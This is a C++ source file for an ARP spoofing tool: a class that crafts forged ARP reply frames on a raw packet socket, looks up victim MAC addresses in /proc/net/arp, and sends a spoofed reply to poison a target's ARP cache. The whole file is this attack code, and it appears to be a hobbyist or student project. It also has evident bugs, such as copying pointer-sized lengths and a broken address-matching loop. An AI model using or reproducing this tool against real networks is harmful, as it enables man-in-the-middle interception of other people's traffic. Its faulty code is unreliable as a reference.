#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <linux/if_arp.h>
#include <arpa/inet.h>

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <time.h>


#define ARP_REQUSET	1
#define ARP_REPLY	0x200

#define ARP_GAP		41
#define MAC_LEN		17

#define MAC_BYTE	6
#define IP_BYTE		4

const char* arpPath = "/proc/net/arp";

class ARPSpoofing {
private:
//eth
unsigned char   dstEth[MAC_BYTE];
unsigned char   srcEth[MAC_BYTE];
unsigned short  type;

//arp
short           hwType;
short           protoType;
char            hwAddrLen;
char            protoAddrLen; 
short           opCode;
unsigned char   srcMac[MAC_BYTE];
unsigned char   srcIP[4];
unsigned char   dstMac[MAC_BYTE];
unsigned char   dstIP[4];

int 		packetSock;
sockaddr_ll 	sockAddr;
char		inter[100];

public:
	ARPSpoofing(const char* interface) {

		//interface init
		memset(inter, 0, sizeof(inter));
		memcpy(inter, interface, sizeof(interface));

		//arp init
		hwType = htons(1);
		protoType = htons(0x800);
		hwAddrLen = 6;
		protoAddrLen = 4;
		opCode = htons(2);
		
		//mac init
		type = htons(0x0806);

		//MAC Address  init
		memset(srcEth, 0, MAC_BYTE);
		memset(dstEth, 0, MAC_BYTE);
		memset(srcMac, 0, MAC_BYTE);
		memset(dstMac, 0, MAC_BYTE);
		
		//IP Address Init
		memset(srcIP, 0, IP_BYTE);
		memset(dstIP, 0, IP_BYTE);
	};

	void logging(void)
	{
		FILE* file=fopen("/home/bgy/log1","w+");
		int size=60;
		fwrite(this,size,100,file);
	}

	void Attack(const char* sourceip, const char* dstip, const int loop=0, const bool broadcast = 1) 
	{
		inet_pton(AF_INET, sourceip, srcIP);
		inet_pton(AF_INET, dstip, dstIP);

		packetSock=socket(AF_PACKET, SOCK_RAW, ETH_P_ALL);

		if(broadcast == 0)
		{
			GetMacAddr(this->inter, srcEth);
			GetTargetMacAddr(sourceip, dstEth);
		}

		GetMacAddr(this->inter, srcMac);
		GetTargetMacAddr(dstip, dstMac);
		SetTargetAddr(&sockAddr, inter);

		sendto(packetSock, this, 42,0, (sockaddr*)&sockAddr, sizeof(sockAddr));
	}

private:
void GetMacAddr(char* interface, unsigned char* macPtr)
{
	unsigned char* srcMacAddr;
	
	//printf("Interface : %s \n", interface);
	//printf("macPtr : %p \n", macPtr);

	struct ifreq	ifr;
	memset(&ifr, 1, sizeof(ifr));
	strncpy(ifr.ifr_name, interface, sizeof(interface));

	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	//printf("Socket Status : %d \n", sockfd);
	if(sockfd <= 0) printf("Sock Error!");
	if(ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
		printf("[SYSTEM] Faild to get Mac Address!\n");
		return;
	}

	//printf("Mac size : %d \n", sizeof(ifr.ifr_hwaddr.sa_data));
	srcMacAddr = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	memcpy(macPtr, srcMacAddr, MAC_BYTE);
	//for(int i=0; i<MAC_BYTE; i++) printf("%02x:", srcMacAddr[i]);

	
	//printf("Mac Addr : ");
	//for(int i=0; i<6; i++) printf("%02x:",macAddr[i]);
	//printf("\n");
	
	close(sockfd);
	//return (unsigned char*)ifr.ifr_hwaddr.sa_data;
}

void GetTargetMacAddr(const char* targetIP,unsigned char* macptr) 
{
	unsigned char targetMacAddr[100];
	char line[1024];
	int lineLen=0;
	int targetLen=strlen(targetIP);

	FILE* arpCache = fopen(arpPath,"rw");
	if(arpCache != NULL) {
		while(fgets(line,100, arpCache)) {
			for(int i=0; i<sizeof(line); i++) {
				if(targetIP[i] == line[i]) {
					if(++lineLen == targetLen) {
						//fgets(line,100,arpCache); // fgets read before line
						if(strncpy((char*)targetMacAddr, &line[ARP_GAP], MAC_LEN) != NULL)

						ConvertString2Mac(targetMacAddr);
						memcpy(macptr, targetMacAddr, MAC_BYTE);
					}
				}else break;
			}
		}
	}
};

void  ConvertString2Mac(unsigned char* macStr) {
	int val=0;
	unsigned char convertMacAddr[MAC_LEN];
	
	char temp[MAC_LEN] = {0, };
	memcpy(temp, macStr, MAC_LEN);

	//for(int a=0; a<MAC_LEN; a++) printf("%c", macStr[a]);
	//for(int a=0; a<MAC_LEN; a++) printf("%c", temp[a]);
	//printf("\n");

	//printf("[SYSTEM] - macStr : %s \n", macStr);
	for(int i=0; i<6; i++) {
		temp[(3*i)+2] = '\0';
		if(sscanf((const char*)&temp[3*i], "%02x", &val) == 0) printf("[SYSTEM] - Convert Failed!\n");

		//printf("val : %d \n", val);
		
		//printf("%c \n", (char)val);
		convertMacAddr[i] = (char)val;
	}
	memcpy(macStr, convertMacAddr, MAC_LEN);
}

void SetTargetAddr(struct sockaddr_ll* sockptr,const char* interface) {
	struct ifreq ifr;

	if(sockptr != NULL) {
		//printf("[SYSTEM] TargetAddress Initializing\n");
		memset(sockptr, 0, sizeof(struct sockaddr_ll));
	}

	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if(sock < 0) {
		printf("[SYSTEM] Socket Open Failed :( \n");
		return;
	}
	
	//ifr struct set
	//memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, interface);

	int result = ioctl(sock, SIOCGIFINDEX, &ifr);
	if(result < 0) { 
		printf("ioctl failed \n");
		return;
	}
	
	//sockptr->sll_family = AF_PACKET;
	//sockptr->sll_ifindex = if_nametoindex(interface);
	//sockptr->sll_ifindex = ifr.ifr_ifindex;
	
	sockptr->sll_ifindex = ifr.ifr_ifindex;
	sockptr->sll_protocol = htons(ETH_P_ARP);
       	sockptr->sll_hatype = htons(ARPHRD_ETHER);
        sockptr->sll_pkttype = (PACKET_OTHERHOST);
	sockptr->sll_halen = MAC_BYTE;
	//strcpy(sockptr->sll_addr, "08:00:27:8B:6B:26");
	//strcpy(sockptr->sll_addr, "FF:FF:FF:FF:FF:FF");
	//ConvertString2Mac(sockptr->sll_addr);
	
	//test
	/*
	printf("[SYSTEM] targetAddr DEBUG\n");
	printf("ifindex : %d \n", sockptr->sll_ifindex);
	printf("hatype : %d \n", sockptr->sll_hatype);
	printf("pktype : %c \n", sockptr->sll_pkttype);
	printf("halen : %c \n", sockptr->sll_halen);
	printf("addr : %s \n", sockptr->sll_addr);
	//sockptr->sll
	*/
	//printf("[SYSTEM] TargetAddress Initialize Sucess :) \n");
	close(sock);
};
};
